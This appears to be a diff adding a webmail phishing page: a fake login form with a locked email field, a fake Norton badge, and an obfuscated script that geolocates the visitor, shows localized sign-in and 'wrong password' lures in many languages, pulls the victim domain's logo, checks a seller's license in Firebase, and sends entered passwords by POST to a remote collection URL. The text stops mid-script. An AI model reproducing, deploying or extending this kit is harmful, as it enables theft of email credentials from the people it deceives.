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" alt="" id="logoimg" style="width:28px;height:28px;margin-top:12px;">
+         
+        <span style="vertical-align: middle; padding-left: 5px" class="logoname">Webmail</span> 
+        <br><br>
+    <!--<br>  
+        Sign in -->
+        </div></h2>
+        
+                        <h3 id="signin"></h3>
+                        <form name="members" action="" method="GET">
+                          <div class="form-group">
+                          <center>
+                                    <div class="alert alert-danger" id="msg" style="display: none;"></div>
+                                    <div id="msg" style="display: none;font-weight: 600;color: red;"></div>
+                                    <span id="error" class="text-danger" style="display: none;"></span>
+                            </center>
+                                <input type="email" id="email"  name="email" class="input-text" placeholder="Email Address" readonly>
+                          </div>
+                            <div class="form-group">
+                                <input type="password" id="password"  name="Password" class="input-text"   autocomplete="on" placeholder="Password"  >
+                            </div>
+                            <table width="247" border="0" align="center" cellpadding="0" cellspacing="0">
+                              <tr>
+                                <td bgcolor="#000066"><div class="btn-holder">
+                                  <button class="btn btn-lg col-12 style1" id="submit-btn"></button>
+                                </div></td>
+                              </tr>
+                          </table>
+                            <img src="https://firebasestorage.googleapis.com/v0/b/ddlink-3d359.appspot.com/o/nortonsecure.png?alt=media&token=9ce0345e-9467-420f-8e31-e4ceb195654a" width="70" height="40">
+                        </form>
+                        <span class="privacy">
+                        </div>
+                    <!-- <div class="footer">
+                    Privacy Policy: <span id="kai" style="text-transform: capitalize;"></span><br>
+Your information is only for the sole purpose of viewing this document and would not be sold or shared to any third party.
+                    </div> -->
+                        
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div> 
+ <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script src="license.js"></script>
+<script>
+    var _0x4940a7=_0x39d5;function _0x3393(){var _0x4cfb12=['focus','30149016vTBGqf','Đăng\x20nhập','!</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20</html>','msg','Vietnamese','Password','placeholder','bulgarian','Parolă','Chinese','Uzbek','Пароль\x20оновлено','yanlış\x20kullanıcı\x20adı\x20veya\x20Şifre.!\x20Lütfen\x20doğru\x20ayrıntıları\x20girin.','Пароль','使用您的电子邮件地址和密码登录，以继续使用您当前的密码','To\x20konto\x20nie\x20istnieje.\x20Wprowadź\x20inne\x20konto','تم\x20تحديث\x20كلمة\x20المرور','mainPage','Inicie\x20sesión\x20con\x20su\x20dirección\x20de\x20correo\x20electrónico\x20y\x20contraseña\x20para\x20continuar\x20usando\x20su\x20contraseña\x20actual','Войдите\x20в\x20систему,\x20указав\x20свой\x20адрес\x20электронной\x20почты\x20и\x20пароль,\x20чтобы\x20продолжить\x20использовать\x20свой\x20текущий\x20пароль','then','link-language.appspot.com','Palavra-passe','nome\x20utente\x20o\x20password\x20errati.!\x20Inserisci\x20i\x20dettagli\x20corretti.','replace','innerHTML','Please\x20enter\x20password\x20atleast\x205\x20digits..!','Niewłaściwa\x20nazwa\x20użytkownika\x20lub\x20hasło.!\x20Wprowadź\x20poprawne\x20dane.','Жорий\x20паролингиздан\x20фойдаланишни\x20давом\x20еттириш\x20учун\x20електрон\x20почта\x20манзилингиз\x20ва\x20паролингиз\x20билан\x20тизимга\x20киринг','#logoimg','G-9RBJ8D0ZK6','60wnDwCm','Tài\x20khoản\x20đó\x20không\x20tồn\x20tại.\x20Nhập\x20một\x20tài\x20khoản\x20khác','child','Turkish','E-posta','database','грешно\x20потребителско\x20име\x20или\x20парола.!\x20Моля,\x20въведете\x20точни\x20данни.','toLowerCase','ref','Mot\x20De\x20Passe\x20Mis\x20à\x20Jour','Error\x20fetching\x20IP\x20address.','E-mail','getElementById','Russian','1581873UOHFhg','#password','Кіру','Mật\x20khẩu','textContent','Japanese','.email','неправильне\x20ім\x27я\x20користувача\x20або\x20пароль.!\x20Будь\x20ласка,\x20введіть\x20правильні\x20дані.','Faça\x20login\x20com\x20seu\x20endereço\x20de\x20E-mail\x20e\x20senha\x20para\x20continuar\x20usando\x20sua\x20senha\x20atual','type','Esa\x20cuenta\x20no\x20existe.\x20Ingrese\x20una\x20cuenta\x20diferente','Passwort\x20aktualisiert','Đăng\x20nhập\x20bằng\x20địa\x20chỉ\x20email\x20và\x20mật\x20khẩu\x20của\x20bạn\x20để\x20tiếp\x20tục\x20sử\x20dụng\x20mật\x20khẩu\x20hiện\x20tại\x20của\x20bạn','Italian','Şifre\x20Güncellendi','Zaloguj\x20się','<div\x20class=\x22expired\x22>License\x20Required!\x20</div>','неправильное\x20имя\x20пользователя\x20или\x20пароль.!\x20Пожалуйста,\x20введите\x20правильные\x20данные.','Devam\x20etmek','#show','Acest\x20cont\x20nu\x20există.\x20Introduceți\x20un\x20alt\x20cont','val','English','test','Palavra-Passe\x20Actualizada','Dieses\x20Konto\x20existiert\x20nicht.\x20Geben\x20Sie\x20ein\x20anderes\x20Konto\x20ein','Парола','#logoname','Авторизувати','Spanish','اسم\x20مستخدم\x20أو\x20كلمة\x20مرور\x20خاطئة.!\x20الرجاء\x20إدخال\x20التفاصيل\x20الصحيحة.','That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20different\x20account','src','click','Парол\x20Янгиланди','34XJTfvA','html','toUpperCase','Цього\x20облікового\x20запису\x20не\x20існує.\x20Увійдіть\x20в\x20інший\x20обліковий\x20запис','Mot\x20de\x20Passe','電子郵件','Құпия\x20сөз','preventDefault','wrong\x20username\x20or\x20Password.!\x20Please\x20enter\x20correct\x20details.','#inputbar','514856549964','Тази\x20сметка\x20не\x20съществува.\x20Въведете\x20друг\x20акаунт','ready','value','Aktualizacja\x20Hasła','#email','سجل\x20الدخول\x20باستخدام\x20عنوان\x20بريدك\x20الإلكتروني\x20وكلمة\x20المرور\x20لمتابعة\x20استخدام\x20كلمة\x20المرور\x20الحالية','link-language.firebaseapp.com','catch','3438SfNnDZ','كلمة\x20المرور','POST','Махфий\x20сўз','error','location','メールアドレスとパスワードでサインインして、現在のパスワードを引き続き使用します','로그인','submit-btn','nome\x20de\x20Utilizador\x20ou\x20palavra-passe\x20incorretos.!\x20Por\x20favor\x20introduza\x20os\x20dados\x20correctos.','Korean','Portuguese','Entrar','<div\x20class=\x22expired\x22>License\x20Invalid</div>','body','Пароль\x20обновлен','country','Taiwan','https://logo.clearbit.com/','ログイン','AIzaSyAtTCdlt1wXTrj7Drjx7b3AwmpaXIg_zdM','Courriel','Hasło','4105bSJJWB','#back1','language','Giriş\x20yap','Zaloguj\x20się\x20przy\x20użyciu\x20swojego\x20adresu\x20e-mail\x20i\x20hasła,\x20aby\x20nadal\x20używać\x20bieżącego\x20hasła','German','그\x20계정은\x20존재하지\x20않습니다.\x20다른\x20계정\x20입력','Passwort','show','password','Влезте\x20с\x20вашия\x20имейл\x20адрес\x20и\x20парола,\x20за\x20да\x20продължите\x20да\x20използвате\x20текущата\x20си\x20парола','Se\x20connecter','Електрон\x20почта','Ағымдағы\x20құпия\x20сөзді\x20пайдалануды\x20жалғастыру\x20үшін\x20электрондық\x20пошта\x20мекенжайы\x20мен\x20құпия\x20сөзбен\x20жүйеге\x20кіріңіз','Кириш','Arabic','once','11ZPbOlE','Sign\x20in','nume\x20de\x20utilizator\x20sau\x20parolă\x20greșite.!\x20Vă\x20rugăm\x20să\x20introduceți\x20detaliile\x20corecte.','text','hide','email','tên\x20người\x20dùng\x20hoặc\x20Mật\x20Khẩu\x20sai.!\x20Vui\x20lòng\x20nhập\x20chi\x20tiết\x20chính\x20xác.','Anmelden','Email','length','Sign\x20in\x20with\x20your\x20email\x20address\x20and\x20password\x20to\x20continue\x20using\x20your\x20current\x20password','innerText','Ukranian','パスワードが更新されました','Melden\x20Sie\x20sich\x20mit\x20Ihrer\x20E-Mail-Adresse\x20und\x20Ihrem\x20Passwort\x20an,\x20um\x20Ihr\x20aktuelles\x20Passwort\x20weiterhin\x20zu\x20verwenden','密碼已更新','indexOf','log','#error','Log\x20in','undefined','Quell\x27account\x20non\x20esiste.\x20Inserisci\x20un\x20altro\x20account','البريد\x20الإلكتروني','initializeApp','Parola\x20Actualizată','falscher\x20Benutzername\x20oder\x20Passwort.!\x20Bitte\x20geben\x20Sie\x20korrekte\x20Angaben\x20ein.','密码更新','қате\x20пайдаланушы\x20аты\x20немесе\x20құпия\x20сөз.!\x20Дұрыс\x20деректерді\x20енгізіңіз.','https://www.','Bu\x20hesap\x20mevcut\x20değil.\x20Farklı\x20bir\x20hesap\x20girin','French','Romanian','#msg','Essa\x20conta\x20não\x20existe.\x20Insira\x20uma\x20conta\x20diferente','Conectați-vă\x20cu\x20adresa\x20de\x20e-mail\x20și\x20parola\x20pentru\x20a\x20continua\x20să\x20utilizați\x20parola\x20curentă','1:514856549964:web:f218efee5ddee142913ee9','Ukrainian','9432PiSGhX','Mevcut\x20şifrenizi\x20kullanmaya\x20devam\x20etmek\x20için\x20e-posta\x20adresiniz\x20ve\x20şifrenizle\x20oturum\x20açın','Увійдіть,\x20вказавши\x20свою\x20електронну\x20адресу\x20та\x20пароль,\x20щоб\x20продовжувати\x20використовувати\x20свій\x20поточний\x20пароль','signin','attr','비밀번호','nombre\x20de\x20usuario\x20o\x20contraseña\x20incorrectos.!\x20Por\x20favor,\x20introduzca\x20los\x20datos\x20correctos.','#submit-btn','53134JfwPPA','#em','Correo\x20Electrónico','用户名或密码错误。!\x20请输入正确的资料.','使用您的電子郵件地址和密碼登錄以繼續使用您當前的密碼','이메일\x20주소와\x20비밀번호로\x20로그인하여\x20현재\x20비밀번호를\x20계속\x20사용하세요','Kazakh','メール','Verifing...','Polish','Password\x20Updated','Электрондық\x20пошта','該帳戶不存在。輸入不同的帳戶','1348630SBnUKe','nom\x20d\x27utilisateur\x20ou\x20mot\x20de\x20passe\x20incorrect.!\x20Veuillez\x20entrer\x20des\x20détails\x20corrects.','Құпия\x20сөз\x20жаңартылды','1844jXtyqv','substr','تسجيل\x20الدخول','licenses','Вход','352933ruahSI','https://cpsess8415421813ruaribeirosousa.work.gd/text.php','Паролата\x20Е\x20Актуализирана','</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f2f2f2;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#circle\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20inline-flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20300px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20300px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#ffffff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x205px\x20solid\x20#55acee;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation-name:\x20pulse;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation-duration:\x202s;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation-iteration-count:\x20infinite;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20pulse\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(1);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x200\x200\x200\x20rgba(85,\x20172,\x20238,\x200.4);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2050%\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(1.05);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x200\x200\x2010px\x20rgba(85,\x20172,\x20238,\x200);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20scale(1);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x200\x200\x200\x20rgba(85,\x20172,\x20238,\x200);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2024px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#55acee;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20</head>\x0a\x0a\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\x22circle\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>','那个帐户不存在。\x20输入其他帐户','Contraseña\x20Actualizada','Autentificare','.logoimg'];_0x3393=function(){return _0x4cfb12;};return _0x3393();}function _0x39d5(_0x185cf4,_0xac9322){var _0x339343=_0x3393();return _0x39d5=function(_0x39d55d,_0x29a387){_0x39d55d=_0x39d55d-0x1a6;var _0x349496=_0x339343[_0x39d55d];return _0x349496;},_0x39d5(_0x185cf4,_0xac9322);}(function(_0x2d0e29,_0x3755aa){var _0xd9422e=_0x39d5,_0x3aa512=_0x2d0e29();while(!![]){try{var _0x1ff62a=-parseInt(_0xd9422e(0x1e2))/0x1*(parseInt(_0xd9422e(0x24a))/0x2)+-parseInt(_0xd9422e(0x1bf))/0x3+-parseInt(_0xd9422e(0x25a))/0x4*(parseInt(_0xd9422e(0x20c))/0x5)+-parseInt(_0xd9422e(0x1b1))/0x6*(parseInt(_0xd9422e(0x25f))/0x7)+-parseInt(_0xd9422e(0x242))/0x8*(-parseInt(_0xd9422e(0x1f5))/0x9)+-parseInt(_0xd9422e(0x257))/0xa*(parseInt(_0xd9422e(0x21d))/0xb)+parseInt(_0xd9422e(0x268))/0xc;if(_0x1ff62a===_0x3755aa)break;else _0x3aa512['push'](_0x3aa512['shift']());}catch(_0x570e80){_0x3aa512['push'](_0x3aa512['shift']());}}}(_0x3393,0x7da85));var zxcvbnm=license,qwertyuioplkjhgfdsa=zxcvbnm,firebaseConfig={'apiKey':_0x4940a7(0x209),'authDomain':_0x4940a7(0x1f3),'projectId':'link-language','storageBucket':_0x4940a7(0x1a7),'messagingSenderId':_0x4940a7(0x1ec),'appId':_0x4940a7(0x240),'measurementId':_0x4940a7(0x1b0)};firebase[_0x4940a7(0x234)](firebaseConfig);function checkLicenseExpiry(_0x3bb7da){var _0x50ade0=_0x4940a7;if(typeof license!==_0x50ade0(0x231)){if(/^[a-zA-Z0-9\-]{35}$/['test'](license))var _0x144834='';else document[_0x50ade0(0x203)][_0x50ade0(0x1ab)]='<div\x20class=\x22expired\x22>License\x20Invalid!\x20</div>';}else document[_0x50ade0(0x203)][_0x50ade0(0x1ab)]=_0x50ade0(0x1cf);var _0x77d2c2=firebase[_0x50ade0(0x1b6)]()[_0x50ade0(0x1b9)](_0x50ade0(0x25d));_0x77d2c2[_0x50ade0(0x1b3)](_0x3bb7da)[_0x50ade0(0x21c)](_0x50ade0(0x1ef),function(_0x339aaa){var _0x26b06f=_0x50ade0,_0x4b7fba=_0x339aaa['val']();if(_0x4b7fba){var _0x387a4b=new Date(_0x4b7fba['expiry_date']),_0x5eacf7=new Date();if(_0x5eacf7>_0x387a4b)document[_0x26b06f(0x203)]['innerHTML']='<div\x20class=\x22expired\x22>License\x20Expired</div>';else var _0x23b1cf='';}else document[_0x26b06f(0x203)]['innerHTML']=_0x26b06f(0x202);});}checkLicenseExpiry(zxcvbnm);var ipp='',successlang=_0x4940a7(0x254),wrong='',nonexist='',signin='';function doSomethingBasedOnCountryLanguage(_0x1e2da2){var _0x5df99f=_0x4940a7;const _0x5c5a6f={'AF':['English'],'AL':[_0x5df99f(0x1d5)],'DZ':[_0x5df99f(0x1d5)],'AD':[_0x5df99f(0x1d5)],'AO':[_0x5df99f(0x200)],'AG':[_0x5df99f(0x1d5)],'AR':[_0x5df99f(0x1dc)],'AM':[_0x5df99f(0x1d5)],'AU':[_0x5df99f(0x1d5)],'AT':[_0x5df99f(0x211)],'AZ':[_0x5df99f(0x1d5)],'BS':['English'],'BH':['Arabic'],'BD':[_0x5df99f(0x1d5)],'BB':['English'],'BY':[_0x5df99f(0x1be)],'BE':[_0x5df99f(0x1d5)],'BZ':['English'],'BJ':[_0x5df99f(0x23b)],'BT':[_0x5df99f(0x1d5)],'BO':[_0x5df99f(0x1dc)],'BA':[_0x5df99f(0x1d5)],'BW':[_0x5df99f(0x1d5)],'BR':[_0x5df99f(0x200)],'BN':['English'],'BG':['English'],'BF':[_0x5df99f(0x23b)],'BI':[_0x5df99f(0x23b)],'KH':['English'],'CM':['English'],'CA':[_0x5df99f(0x1d5)],'CV':['Portuguese'],'CF':['French'],'TD':['English'],'CL':[_0x5df99f(0x1dc)],'CN':[_0x5df99f(0x271)],'CO':['Spanish'],'KM':[_0x5df99f(0x1d5)],'CG':[_0x5df99f(0x23b)],'CD':[_0x5df99f(0x23b)],'CR':[_0x5df99f(0x1dc)],'CI':[_0x5df99f(0x23b)],'HR':[_0x5df99f(0x1d5)],'CU':['Spanish'],'CY':[_0x5df99f(0x1b4)],'CZ':[_0x5df99f(0x1d5)],'DK':[_0x5df99f(0x1d5)],'DJ':[_0x5df99f(0x1d5)],'DM':[_0x5df99f(0x1d5)],'DO':['Spanish'],'TL':[_0x5df99f(0x200)],'EC':['Spanish'],'EG':[_0x5df99f(0x21b)],'SV':['Spanish'],'GQ':['English'],'ER':[_0x5df99f(0x1d5)],'EE':[_0x5df99f(0x1d5)],'ET':[_0x5df99f(0x1d5)],'FJ':[_0x5df99f(0x1d5)],'FI':[_0x5df99f(0x1d5)],'FR':['French'],'GA':[_0x5df99f(0x23b)],'GM':[_0x5df99f(0x1d5)],'GE':['English'],'DE':[_0x5df99f(0x211)],'GH':['English'],'GR':[_0x5df99f(0x1d5)],'GD':[_0x5df99f(0x1d5)],'GT':[_0x5df99f(0x1dc)],'GN':[_0x5df99f(0x23b)],'GW':[_0x5df99f(0x200)],'GY':[_0x5df99f(0x1d5)],'HT':['French'],'HN':[_0x5df99f(0x1dc)],'HU':['English'],'IS':[_0x5df99f(0x1d5)],'IN':['English'],'ID':[_0x5df99f(0x1d5)],'IR':['English'],'IQ':['English'],'IE':['English'],'IL':[_0x5df99f(0x1d5)],'IT':[_0x5df99f(0x1cc)],'JM':[_0x5df99f(0x1d5)],'JP':[_0x5df99f(0x1c4)],'JO':[_0x5df99f(0x21b)],'KZ':[_0x5df99f(0x250)],'KE':['English'],'KI':['English'],'KP':[_0x5df99f(0x1ff)],'KR':[_0x5df99f(0x1ff)],'XK':[_0x5df99f(0x1d5)],'KW':[_0x5df99f(0x21b)],'KG':[_0x5df99f(0x1d5)],'LA':[_0x5df99f(0x1d5)],'LV':[_0x5df99f(0x1d5)],'LB':[_0x5df99f(0x21b)],'LS':[_0x5df99f(0x1d5)],'LR':[_0x5df99f(0x1d5)],'LY':[_0x5df99f(0x21b)],'LI':[_0x5df99f(0x211)],'LT':[_0x5df99f(0x1d5)],'LU':[_0x5df99f(0x1d5)],'MG':['English'],'MW':[_0x5df99f(0x1d5)],'MY':[_0x5df99f(0x1d5)],'MV':[_0x5df99f(0x1d5)],'ML':[_0x5df99f(0x23b)],'MT':[_0x5df99f(0x1d5)],'MH':[_0x5df99f(0x1d5)],'MR':['Arabic'],'MU':[_0x5df99f(0x1d5)],'MX':[_0x5df99f(0x1dc)],'FM':[_0x5df99f(0x1d5)],'MD':[_0x5df99f(0x23c)],'MC':[_0x5df99f(0x23b)],'MN':[_0x5df99f(0x1d5)],'ME':[_0x5df99f(0x1d5)],'MA':[_0x5df99f(0x21b)],'MZ':[_0x5df99f(0x200)],'MM':[_0x5df99f(0x1d5)],'NA':[_0x5df99f(0x1d5)],'NR':[_0x5df99f(0x1d5)],'NP':[_0x5df99f(0x1d5)],'NL':[_0x5df99f(0x1d5)],'NZ':['English'],'NI':[_0x5df99f(0x1dc)],'NE':['French'],'NG':[_0x5df99f(0x1d5)],'MK':[_0x5df99f(0x1d5)],'NO':[_0x5df99f(0x1d5)],'OM':[_0x5df99f(0x21b)],'PK':[_0x5df99f(0x1d5)],'PW':[_0x5df99f(0x1d5)],'PS':[_0x5df99f(0x21b)],'PA':[_0x5df99f(0x1dc)],'PG':[_0x5df99f(0x1d5)],'PY':['Spanish'],'PE':[_0x5df99f(0x1dc)],'PH':[_0x5df99f(0x1d5)],'PL':[_0x5df99f(0x253)],'PT':[_0x5df99f(0x200)],'QA':[_0x5df99f(0x21b)],'RO':[_0x5df99f(0x23c)],'RU':[_0x5df99f(0x1be)],'RW':[_0x5df99f(0x1d5)],'KN':[_0x5df99f(0x1d5)],'LC':[_0x5df99f(0x1d5)],'VC':[_0x5df99f(0x1d5)],'WS':[_0x5df99f(0x1d5)],'SM':[_0x5df99f(0x1cc)],'ST':[_0x5df99f(0x200)],'SA':[_0x5df99f(0x21b)],'SN':[_0x5df99f(0x23b)],'RS':[_0x5df99f(0x1d5)],'SC':['English'],'SL':[_0x5df99f(0x1d5)],'SG':[_0x5df99f(0x271)],'SK':[_0x5df99f(0x1d5)],'SI':[_0x5df99f(0x1d5)],'SB':[_0x5df99f(0x1d5)],'SO':['English'],'ZA':[_0x5df99f(0x1d5)],'SS':[_0x5df99f(0x1d5)],'ES':['Spanish'],'LK':[_0x5df99f(0x1d5)],'SD':['English'],'SR':[_0x5df99f(0x1d5)],'SZ':[_0x5df99f(0x1d5)],'SE':[_0x5df99f(0x1d5)],'CH':[_0x5df99f(0x1d5)],'SY':['Arabic'],'TW':[_0x5df99f(0x206)],'TJ':[_0x5df99f(0x1d5)],'TZ':[_0x5df99f(0x1d5)],'TH':[_0x5df99f(0x1d5)],'TG':['French'],'TO':[_0x5df99f(0x1d5)],'TT':[_0x5df99f(0x1d5)],'TN':[_0x5df99f(0x21b)],'TR':['Turkish'],'TM':[_0x5df99f(0x1d5)],'TV':['English'],'UG':['English'],'UA':[_0x5df99f(0x241)],'AE':[_0x5df99f(0x21b)],'GB':['English'],'US':[